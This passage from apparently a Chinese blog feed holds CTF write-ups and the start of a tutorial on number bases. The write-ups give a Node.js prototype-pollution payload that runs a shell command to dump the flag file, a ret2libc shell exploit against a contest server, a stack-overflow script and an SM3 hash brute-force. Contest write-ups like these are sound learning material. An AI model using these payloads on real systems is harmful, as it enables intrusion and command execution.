src="/assets/post_img/ctf/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E5%B9%B4%E4%B8%93%E9%A1%B9%E8%B5%9B%E5%88%9D%E8%B5%9B/cyber1.png" alt="cyber1"></p><p><img src="/assets/post_img/ctf/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E5%B9%B4%E4%B8%93%E9%A1%B9%E8%B5%9B%E5%88%9D%E8%B5%9B/cyber2.png" alt="image-20241124183400276"></p><p>在Message.js中的save方法使用JSON.parse解析输入，可以尝试原型链污染</p><p><img src="/assets/post_img/ctf/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E5%B9%B4%E4%B8%93%E9%A1%B9%E8%B5%9B%E5%88%9D%E8%B5%9B/cyber3.png" alt="image-20241124184015039"></p><p>尝试payload：</p><p><code>&#123;&quot;content&quot;:&quot;123&quot;,&quot;__proto__&quot;:&#123;&quot;block&quot;: &#123;&quot;type&quot;:&quot;Text&quot;,&quot;line&quot;:&quot;process.mainModule.require('child_process').exec('whoami')&quot;&#125;&#125;&#125;</code></p><p>发现没有回显，尝试写入文件</p><p>payload：</p><p><code>&#123;&quot;__proto__&quot;:&#123;&quot;block&quot;:&#123;&quot;type&quot;:&quot;Text&quot;,&quot;line&quot;:&quot;process.mainModule.require('child_process').execSync('cat /f* &gt; /app/public/aaaaaa.txt')&quot;&#125;&#125;&#125;</code></p><p>访问url/aaaaa.txt</p><p><img src="/assets/post_img/ctf/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E5%B9%B4%E4%B8%93%E9%A1%B9%E8%B5%9B%E5%88%9D%E8%B5%9B/cyber4.png" alt="image-20241124184851340"></p><h1>PWN</h1><h2 id="1-clock-in">1.clock_in</h2><p>查看保护</p><p><img src="/assets/post_img/ctf/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E5%B9%B4%E4%B8%93%E9%A1%B9%E8%B5%9B%E5%88%9D%E8%B5%9B/clock1.png" alt="image-20241124143848587"></p><p>fgets读取长度远大于s，可以溢出</p><p><img src="/assets/post_img/ctf/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E5%B9%B4%E4%B8%93%E9%A1%B9%E8%B5%9B%E5%88%9D%E8%B5%9B/clock2.png" alt="image-20241124143725859"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io=process(&quot;./clock_in&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;123.56.237.38&quot;</span>, <span class="number">28685</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*(<span class="number">64</span>+<span class="number">8</span>) + p64(<span class="number">0x4011C5</span>) + p64(<span class="number">0x403FD8</span>) + p64(<span class="number">0x401060</span>) + p64(<span class="number">0X401207</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">A=u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">f&quot;A: <span class="subst">&#123;<span class="built_in">hex</span>(A)&#125;</span>&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">libc_base = A - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">payload =  <span class="string">b&quot;A&quot;</span>*(<span class="number">64</span>+<span class="number">8</span>) + p64(<span class="number">0x4011C5</span>) +  p64(binsh) + p64(system)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024年江苏移动“赋能建功”网络安全技能竞赛竞赛个人wp</title>
      <link href="/posts/1f94312c.html"/>
      <url>/posts/1f94312c.html</url>
      
        <content type="html"><![CDATA[<h1>2024 年江苏移动“赋能建功”网络安全技能竞赛竞赛个人 wp</h1><p>只做了几个题。。。二进制手被薄纱了</p><h2 id="pwn">pwn</h2><h3 id="签到">签到</h3><p><img src="/assets/post_img/ctf/2024%E5%B9%B4%E6%B1%9F%E8%8B%8F%E7%A7%BB%E5%8A%A8%E2%80%9C%E8%B5%8B%E8%83%BD%E5%BB%BA%E5%8A%9F%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B/1.png" alt=""></p><p>栈溢出，覆盖 s1 为 admin 即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./p&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;172.20.103.5&quot;, 43736)</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">16</span>  <span class="comment"># 填充到s1位置</span></span><br><span class="line">payload += <span class="string">b&#x27;admin&#x27;</span>  <span class="comment"># 覆盖s1为&quot;admin&quot;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="re">re</h2><h3 id="签到-2">签到</h3><p><img src="/assets/post_img/ctf/2024%E5%B9%B4%E6%B1%9F%E8%8B%8F%E7%A7%BB%E5%8A%A8%E2%80%9C%E8%B5%8B%E8%83%BD%E5%BB%BA%E5%8A%9F%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B/2.png" alt="image-20241116095527090"></p><p>flag{re_1basic_re_12}</p><h2 id="eznote">eznote</h2><p>分析源码，先后经过了 sub_140001010 和 sub_140001630 两次加密最后的密文是 byte_140007038</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> byte_140007038[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x7A</span>, <span class="number">0x36</span>, <span class="number">0x17</span>, <span class="number">0x3A</span>, <span class="number">0x34</span>, <span class="number">0x35</span>, <span class="number">0x49</span>, <span class="number">0x40</span>, <span class="number">0x17</span>, <span class="number">0x20</span>,</span><br><span class="line">  <span class="number">0x49</span>, <span class="number">0x31</span>, <span class="number">0x02</span>, <span class="number">0x2D</span>, <span class="number">0x02</span>, <span class="number">0x1C</span>, <span class="number">0x1E</span>, <span class="number">0x35</span>, <span class="number">0x3D</span>, <span class="number">0x4D</span>,</span><br><span class="line">  <span class="number">0x1E</span>, <span class="number">0x1B</span>, <span class="number">0x49</span>, <span class="number">0x2E</span>, <span class="number">0x0D</span>, <span class="number">0x2A</span>, <span class="number">0x3C</span>, <span class="number">0x2A</span>, <span class="number">0x4D</span>, <span class="number">0x2D</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>分析 sub_140001630</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_140001630</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+0h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">29</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    byte_140007038[i] ^= <span class="number">0x78u</span>;</span><br><span class="line">    result = (<span class="type">unsigned</span> <span class="type">int</span>)(i + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对 byte_140007038 进行 0x78 异或</p><p>分析 sub_140001010</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_140001010</span><span class="params">(__int64 a1, <span class="type">unsigned</span> <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int8 v4; <span class="comment">// [rsp+0h] [rbp-28h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v5; <span class="comment">// [rsp+1h] [rbp-27h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [rsp+4h] [rbp-24h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// [rsp+4h] [rbp-24h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v8; <span class="comment">// [rsp+4h] [rbp-24h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+8h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = *(_BYTE *)(a1 + i);</span><br><span class="line">    <span class="keyword">if</span> ( v9 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v9 == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v9 = <span class="number">2</span>;</span><br><span class="line">        *(_BYTE *)(a3 + v6) = byte_140004400[((<span class="type">int</span>)v4 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span> | (<span class="number">16</span> * (v5 &amp; <span class="number">3</span>))];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v9 = <span class="number">0</span>;</span><br><span class="line">        *(_BYTE *)(a3 + v6++) = byte_140004400[((<span class="type">int</span>)v4 &gt;&gt; <span class="number">6</span>) &amp; <span class="number">3</span> | (<span class="number">4</span> * (v5 &amp; <span class="number">0xF</span>))];</span><br><span class="line">        *(_BYTE *)(a3 + v6) = byte_140004400[v4 &amp; <span class="number">0x3F</span>];</span><br><span class="line">      &#125;</span><br><span class="line">      ++v6;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v9 = <span class="number">1</span>;</span><br><span class="line">      *(_BYTE *)(a3 + v6++) = byte_140004400[((<span class="type">int</span>)v4 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v9 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)(a3 + v6) = byte_140004400[<span class="number">16</span> * (v5 &amp; <span class="number">3</span>)];</span><br><span class="line">    v7 = v6 + <span class="number">1</span>;</span><br><span class="line">    *(_BYTE *)(a3 + v7++) = <span class="number">61</span>;</span><br><span class="line">    *(_BYTE *)(a3 + v7) = <span class="number">61</span>;</span><br><span class="line">    v6 = v7 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v9 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)(a3 + v6) = byte_140004400[<span class="number">4</span> * (v5 &amp; <span class="number">0xF</span>)];</span><br><span class="line">    v8 = v6 + <span class="number">1</span>;</span><br><span class="line">    *(_BYTE *)(a3 + v8) = <span class="number">61</span>;</span><br><span class="line">    v6 = v8 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)(a3 + v6) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>byte_140004400 为码表进行 base64，其中 byte_140004400 是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> byte_140004400[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x41</span>, <span class="number">0x42</span>, <span class="number">0x43</span>, <span class="number">0x44</span>, <span class="number">0x45</span>, <span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x48</span>, <span class="number">0x49</span>, <span class="number">0x4A</span>,</span><br><span class="line">  <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x4D</span>, <span class="number">0x4E</span>, <span class="number">0x30</span>, <span class="number">0x50</span>, <span class="number">0x51</span>, <span class="number">0x52</span>, <span class="number">0x53</span>, <span class="number">0x54</span>,</span><br><span class="line">  <span class="number">0x55</span>, <span class="number">0x56</span>, <span class="number">0x57</span>, <span class="number">0x58</span>, <span class="number">0x59</span>, <span class="number">0x5A</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, <span class="number">0x63</span>, <span class="number">0x64</span>,</span><br><span class="line">  <span class="number">0x65</span>, <span class="number">0x66</span>, <span class="number">0x67</span>, <span class="number">0x68</span>, <span class="number">0x69</span>, <span class="number">0x6A</span>, <span class="number">0x6B</span>, <span class="number">0x6C</span>, <span class="number">0x6D</span>, <span class="number">0x6E</span>,</span><br><span class="line">  <span class="number">0x4F</span>, <span class="number">0x70</span>, <span class="number">0x71</span>, <span class="number">0x72</span>, <span class="number">0x73</span>, <span class="number">0x74</span>, <span class="number">0x75</span>, <span class="number">0x76</span>, <span class="number">0x77</span>, <span class="number">0x78</span>,</span><br><span class="line">  <span class="number">0x79</span>, <span class="number">0x7A</span>, <span class="number">0x6F</span>, <span class="number">0x31</span>, <span class="number">0x32</span>, <span class="number">0x33</span>, <span class="number">0x34</span>, <span class="number">0x35</span>, <span class="number">0x36</span>, <span class="number">0x37</span>,</span><br><span class="line">  <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0x2B</span>, <span class="number">0x2F</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>也就是 <code>ABCDEFGHIJKLMN0PQRSTUVWXYZabcdefghijklmnOpqrstuvwxyzo123456789+/</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 自定义编码表</span></span><br><span class="line">ida_chars = [</span><br><span class="line">    <span class="number">0x41</span>, <span class="number">0x42</span>, <span class="number">0x43</span>, <span class="number">0x44</span>, <span class="number">0x45</span>, <span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x48</span>, <span class="number">0x49</span>, <span class="number">0x4A</span>,</span><br><span class="line">    <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x4D</span>, <span class="number">0x4E</span>, <span class="number">0x30</span>, <span class="number">0x50</span>, <span class="number">0x51</span>, <span class="number">0x52</span>, <span class="number">0x53</span>, <span class="number">0x54</span>,</span><br><span class="line">    <span class="number">0x55</span>, <span class="number">0x56</span>, <span class="number">0x57</span>, <span class="number">0x58</span>, <span class="number">0x59</span>, <span class="number">0x5A</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, <span class="number">0x63</span>, <span class="number">0x64</span>,</span><br><span class="line">    <span class="number">0x65</span>, <span class="number">0x66</span>, <span class="number">0x67</span>, <span class="number">0x68</span>, <span class="number">0x69</span>, <span class="number">0x6A</span>, <span class="number">0x6B</span>, <span class="number">0x6C</span>, <span class="number">0x6D</span>, <span class="number">0x6E</span>,</span><br><span class="line">    <span class="number">0x4F</span>, <span class="number">0x70</span>, <span class="number">0x71</span>, <span class="number">0x72</span>, <span class="number">0x73</span>, <span class="number">0x74</span>, <span class="number">0x75</span>, <span class="number">0x76</span>, <span class="number">0x77</span>, <span class="number">0x78</span>,</span><br><span class="line">    <span class="number">0x79</span>, <span class="number">0x7A</span>, <span class="number">0x6F</span>, <span class="number">0x31</span>, <span class="number">0x32</span>, <span class="number">0x33</span>, <span class="number">0x34</span>, <span class="number">0x35</span>, <span class="number">0x36</span>, <span class="number">0x37</span>,</span><br><span class="line">    <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0x2B</span>, <span class="number">0x2F</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">encoded_chars = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> ida_chars)</span><br><span class="line"><span class="built_in">print</span>(encoded_chars)</span><br><span class="line"><span class="comment"># ABCDEFGHIJKLMN0PQRSTUVWXYZabcdefghijklmnOpqrstuvwxyzo123456789+/</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> ida_chars[] =</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="number">122</span>, <span class="number">54</span>, <span class="number">23</span>, <span class="number">58</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">73</span>, <span class="number">64</span>, <span class="number">23</span>, <span class="number">32</span>,</span><br><span class="line">            <span class="number">73</span>, <span class="number">49</span>, <span class="number">2</span>, <span class="number">45</span>, <span class="number">2</span>, <span class="number">28</span>, <span class="number">30</span>, <span class="number">53</span>, <span class="number">61</span>, <span class="number">77</span>,</span><br><span class="line">            <span class="number">30</span>, <span class="number">27</span>, <span class="number">73</span>, <span class="number">46</span>, <span class="number">13</span>, <span class="number">42</span>, <span class="number">60</span>, <span class="number">42</span>, <span class="number">77</span>, <span class="number">45</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">29</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        ida_chars[i] ^= <span class="number">0x78u</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, ida_chars);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// NoBLM18oX1IzUzdfME5fc1VuRDR5-</span></span><br></pre></td></tr></table></figure><p><img src="/assets/post_img/ctf/2024%E5%B9%B4%E6%B1%9F%E8%8B%8F%E7%A7%BB%E5%8A%A8%E2%80%9C%E8%B5%8B%E8%83%BD%E5%BB%BA%E5%8A%9F%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B/3.png" alt="image-20241116102800638"></p><p>flag{7@K3_4_R3S7_0N_sUnD4y}</p><h2 id="Cy">Cy</h2><h3 id="easy-sm">easy-sm</h3><p>根据已知信息</p><p>哈希：f1127f0189ad9e1bde949fb14991db82c9c9b41e90edcf014898595e8ab908c0</p><p>前五个字符：admin</p><p>明文长度：11</p><p>暴力破解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmssl <span class="keyword">import</span> sm3, func</span><br><span class="line">target_hash = <span class="string">&quot;f1127f0189ad9e1bde949fb14991db82c9c9b41e90edcf014898595e8ab908c0&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000</span>, <span class="number">1000000</span>):</span><br><span class="line">    test_password = <span class="string">f&quot;admin<span class="subst">&#123;i&#125;</span>&quot;</span>  <span class="comment"># 例如：admin100000, admin100001, ...</span></span><br><span class="line">    <span class="comment"># 计算SM3哈希值</span></span><br><span class="line">    calculated_hash = sm3.sm3_hash(func.bytes_to_list(test_password.encode()))</span><br><span class="line">    <span class="keyword">if</span> calculated_hash == target_hash:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;flag&#123;&#123;<span class="subst">&#123;test_password&#125;</span>&#125;&#125;&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;no&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="misc">misc</h2><p><img src="/assets/post_img/ctf/2024%E5%B9%B4%E6%B1%9F%E8%8B%8F%E7%A7%BB%E5%8A%A8%E2%80%9C%E8%B5%8B%E8%83%BD%E5%BB%BA%E5%8A%9F%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B/4.png" alt="image-20241116123305752"></p><p>发现是 base62 编码，继续破解</p><p><img src="/assets/post_img/ctf/2024%E5%B9%B4%E6%B1%9F%E8%8B%8F%E7%A7%BB%E5%8A%A8%E2%80%9C%E8%B5%8B%E8%83%BD%E5%BB%BA%E5%8A%9F%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B/5.png" alt="image-20241116123702202"></p><p>猜测是 rot13</p><p><img src="/assets/post_img/ctf/2024%E5%B9%B4%E6%B1%9F%E8%8B%8F%E7%A7%BB%E5%8A%A8%E2%80%9C%E8%B5%8B%E8%83%BD%E5%BB%BA%E5%8A%9F%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B/6.png" alt="image-20241116123602342"></p><p>栅栏密码两栏有 flag 特征</p><p><img src="/assets/post_img/ctf/2024%E5%B9%B4%E6%B1%9F%E8%8B%8F%E7%A7%BB%E5%8A%A8%E2%80%9C%E8%B5%8B%E8%83%BD%E5%BB%BA%E5%8A%9F%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B/7.png" alt="image-20241116123810903"></p><p>flag{eff05341-9bf6-4e9c-b167-bf7dcb168bc5}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机基础(1)——进制转换与表示，原码、反码、补码</title>
      <link href="/posts/ee909484.html"/>
      <url>/posts/ee909484.html</url>
      
        <content type="html"><![CDATA[<h1>计算机基础(1)——进制转换与表示，原码、反码、补码</h1><h2 id="进制转换">进制转换</h2><h3 id="不同进制用来表示数字的符号">不同进制用来表示数字的符号</h3><table><thead><tr><th>进制</th><th>符号</th></tr></thead><tbody><tr><td>二进制</td><td>0  1</td></tr><tr><td>八进制</td><td>0  1  2  3  4  5  6  7</td></tr><tr><td>十进制</td><td>0  1  2  3  4  5  6  7  8  9  10</td></tr><tr><td>十六进制</td><td>0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F</td></tr></tbody></table><p>几进制就是满几进一</p><p>其中十六进制的 A ~ F 在十进制代表的是10 ~ 15，因为要用一个符号代替，所以用了字母</p><h3 id="任意进制与十进制">任意进制与十进制</h3><h4 id="任意进制—-十进制">任意进制—&gt;十进制</h4><p>假设进制数是x</p><p>任意进制转换十进制的算法为：从右往左数第n位乘x的n-1次幂然后加起来，下面计算是原式从左往右算，手算的话从右往左写幂数更不容易错</p><p>比如说十进制数567，可以表示成：<br>$$<br>5<em>10^2 + 6</em>10^1 + 7<em>10^0<br>$$<br>二进制1010101转十进制，计算方式为<br>$$<br>1</em>2<sup>6+0*2</sup>5+1<em>2<sup>4+0*2</sup>3+1</em>2<sup>2+0*2</sup>1+1<em>2^0=85<br>$$<br>八进制13105640转十进制，计算方式为<br>$$<br>1</em>8<sup>7+3*8</sup>6+1<em>8<sup>5+0*8</sup>4+5</em>8<sup>3+6*8</sup>2+4*8<sup>1+0*8</sup>0=2919328<br>$$<br>十六进制同理，任意进制都可以这么算</p><h4 id="十进制—-其他进制">十进制—&gt;其他进制</h4><p>用十进制数除进制数x得到商和余数，商继续除x得到新的商和余数，继续下去直到商为0，得到的余数就可以组合成对应进制数</p><p>十进制数50转二进制</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">50÷2，商25余0</span><br><span class="line">25÷2，商12余1</span><br><span class="line">12÷2，商 6余0</span><br><span class="line"> 6÷2，商 3余0</span><br><span class="line"> 3÷2，商 1余1</span><br><span class="line"> 1÷2，商 0余1&lt;-商为0，停止</span><br><span class="line"></span><br><span class="line">现在从上到下得到余数010011，实际上的二进制要从下往上倒过来，是110010</span><br><span class="line">所以十进制50的二进制是110010</span><br></pre></td></tr></table></figure><p>十进制数50转八进制</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">50÷8，商6余2</span><br><span class="line"> 6÷8，商0余6&lt;-商为0，停止</span><br><span class="line"> </span><br><span class="line">现在从上到下得到余数26，实际上的八进制要从下往上倒过来，是62</span><br><span class="line">所以十进制50的八进制是62</span><br></pre></td></tr></table></figure><p>十进制数2717转十六进制</p><figure class="highlight 